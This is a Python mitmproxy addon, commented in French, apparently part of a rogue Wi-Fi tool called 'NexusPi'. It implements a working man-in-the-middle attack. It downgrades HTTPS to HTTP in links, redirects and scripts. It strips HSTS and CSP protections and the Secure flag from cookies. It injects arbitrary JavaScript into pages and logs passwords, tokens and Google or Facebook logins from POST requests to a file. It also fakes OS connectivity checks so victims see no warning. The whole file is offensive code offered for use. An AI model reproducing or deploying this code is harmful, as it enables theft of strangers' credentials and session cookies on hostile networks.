"""
NexusPi — addon mitmproxy : sslstrip2 avancé + injection HTML + log creds.

Chargé par mitmdump (mode mitm_https) avec :
    mitmdump --mode transparent --listen-port 8080 -s mitmproxy_inject.py

Variables d'env (positionnées par wifi.py) :
    NEXUSPI_INJECT       JS à injecter avant </body> (vide = pas d'injection)
    NEXUSPI_STRIP_HTTPS  "1" pour activer le SSLstrip2 complet :
                         - Rewrite https → http dans <a>, <form>, <link>, <script>,
                           <img>, <iframe>, Location header, meta refresh
                         - Retire le header Strict-Transport-Security
                         - Retire le flag Secure des cookies
                         - Log les POST contenant des credentials
    NEXUSPI_CRED_LOG     Chemin du fichier de log creds (TSV)

Captive probes : on intercepte les checks de connectivité OS et on répond
"OK" immédiatement → l'OS ne montre PAS le warning "pas d'internet".
"""
import json
import os
import re
import time

INJECT_SCRIPT = (os.environ.get("NEXUSPI_INJECT") or "").strip()
STRIP_HTTPS = os.environ.get("NEXUSPI_STRIP_HTTPS") == "1"
CRED_LOG = os.environ.get("NEXUSPI_CRED_LOG", "")

_INJECTION_BYTES = (
    f"<script>{INJECT_SCRIPT}</script>".encode("utf-8")
    if INJECT_SCRIPT else b""
)

# ── SSLstrip2 : regex pour TOUS les attributs contenant https:// ──────────
# Couvre <a href>, <form action>, <link href>, <script src>, <img src>,
# <iframe src>, <meta content="...url=https://">, srcset, etc.
_HTTPS_ATTR_RE = re.compile(
    rb'((?:href|src|action|content|srcset|poster|data|formaction)'
    rb'\s*=\s*["\'])'
    rb'https://',
    re.IGNORECASE,
)

# JS assignments : window.location = "https://..." etc.
_HTTPS_JS_RE = re.compile(
    rb'((?:window|document|self|top|parent)\.(?:location|href|src)'
    rb'\s*=\s*["\'])'
    rb'https://',
    re.IGNORECASE,
)

# ── Détection des champs de credentials dans les POST ─────────────────────
_CRED_FIELDS = {
    "password", "passwd", "pass", "pwd", "mot_de_passe", "motdepasse",
    "wifi_password", "wpa_password", "secret", "token",
    "login", "username", "user", "email", "mail", "identifiant",
    "google_password", "fb_password", "google_email", "fb_email",
}

# Patterns de probes de connectivité par OS
_204_PATTERNS = (
    "/generate_204",
    "/gen_204",
)
_APPLE_HTML_PATTERNS = (
    "/hotspot-detect.html",
    "/library/test/success.html",
)
_MS_PATTERNS = (
    "/connecttest.txt",
    "/ncsi.txt",
)
_FIREFOX_PATTERNS = (
    "/canonical.html",
    "/success.txt",
)

_APPLE_HTML = (b"<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
               b"<BODY>Success</BODY></HTML>")


def _log_creds(flow, data: dict):
    """Log les credentials interceptés vers le fichier TSV partagé."""
    if not CRED_LOG:
        return
    # Filtrer pour ne garder que les champs intéressants
    cred_data = {}
    for k, v in data.items():
        if any(cf in k.lower() for cf in _CRED_FIELDS):
            cred_data[k] = v
    if not cred_data:
        return
    try:
        host = flow.request.host or "?"
        ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
        ua = flow.request.headers.get("user-agent", "?")
        with open(CRED_LOG, "a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')}\t"
                    f"{ip}\tMITM_CRED\t"
                    f"{json.dumps({'host': host, **cred_data}, ensure_ascii=False)}\t"
                    f"{ua}\n")
    except Exception:
        pass


def request(flow):
    """Hook AVANT que mitmproxy contacte le serveur réel."""
    if not flow.request:
        return
    path = (flow.request.path or "/").split("?")[0]

    from mitmproxy import http

    # 204 No Content (Android / Chrome / Honor / etc.)
    for p in _204_PATTERNS:
        if path.endswith(p):
            flow.response = http.Response.make(204, b"",
                {"Content-Type": "text/html", "Connection": "close"})
            return

    # iOS / macOS — Success HTML
    for p in _APPLE_HTML_PATTERNS:
        if path.endswith(p):
            flow.response = http.Response.make(200, _APPLE_HTML,
                {"Content-Type": "text/html", "Connection": "close"})
            return

    # Microsoft (Windows NCSI)
    if path.endswith("/connecttest.txt"):
        flow.response = http.Response.make(200, b"Microsoft Connect Test",
            {"Content-Type": "text/plain", "Connection": "close"})
        return
    if path.endswith("/ncsi.txt"):
        flow.response = http.Response.make(200, b"Microsoft NCSI",
            {"Content-Type": "text/plain", "Connection": "close"})
        return

    # Firefox
    for p in _FIREFOX_PATTERNS:
        if path.endswith(p):
            flow.response = http.Response.make(200,
                b"<html><body>success</body></html>",
                {"Content-Type": "text/html", "Connection": "close"})
            return

    # ── Log credentials dans les POST ──────────────────────────────────
    if flow.request.method == "POST":
        try:
            ctype = (flow.request.headers.get("content-type") or "").lower()
            body = flow.request.get_text() or ""
            data = {}
            if "application/x-www-form-urlencoded" in ctype:
                from urllib.parse import parse_qs
                parsed = parse_qs(body)
                data = {k: v[0] if v else "" for k, v in parsed.items()}
            elif "application/json" in ctype:
                data = json.loads(body) if body else {}
            if data:
                _log_creds(flow, data)
        except Exception:
            pass


def response(flow):
    """Hook après réception de la réponse : SSLstrip2 + injection."""
    resp = getattr(flow, "response", None)
    if not resp:
        return

    # ── SSLstrip2 : retirer les headers de sécurité ────────────────────
    if STRIP_HTTPS:
        # Supprimer HSTS → le navigateur n'imposera plus HTTPS
        if "strict-transport-security" in resp.headers:
            del resp.headers["strict-transport-security"]

        # Retirer le flag Secure des cookies → cookies envoyés en HTTP aussi
        cookies = resp.headers.get_all("set-cookie")
        if cookies:
            resp.headers.pop("set-cookie")
            for c in cookies:
                c_clean = re.sub(r';\s*[Ss]ecure', '', c)
                resp.headers.add("set-cookie", c_clean)

        # Rewrite Location: header (redirects 301/302/307/308)
        location = resp.headers.get("location")
        if location and location.startswith("https://"):
            resp.headers["location"] = "http://" + location[8:]

        # Rewrite Content-Security-Policy upgrade-insecure-requests
        csp = resp.headers.get("content-security-policy")
        if csp and "upgrade-insecure-requests" in csp.lower():
            resp.headers["content-security-policy"] = re.sub(
                r'upgrade-insecure-requests;?\s*', '', csp, flags=re.IGNORECASE)

    ctype = (resp.headers.get("content-type") or "").lower()
    if "text/html" not in ctype:
        return
    body = resp.content
    if not body:
        return

    # ── SSLstrip2 dans le corps HTML ───────────────────────────────────
    if STRIP_HTTPS:
        # Rewrite tous les attributs HTML contenant https://
        body = _HTTPS_ATTR_RE.sub(rb'\1http://', body)
        # Rewrite les assignments JS (window.location = "https://...")
        body = _HTTPS_JS_RE.sub(rb'\1http://', body)

    # ── Injection JS avant </body> ─────────────────────────────────────
    if _INJECTION_BYTES:
        for tag in (b"</body>", b"</BODY>", b"</Body>"):
            if tag in body:
                body = body.replace(tag, _INJECTION_BYTES + tag, 1)
                break
        else:
            body = body + _INJECTION_BYTES

    if body != resp.content:
        resp.content = body
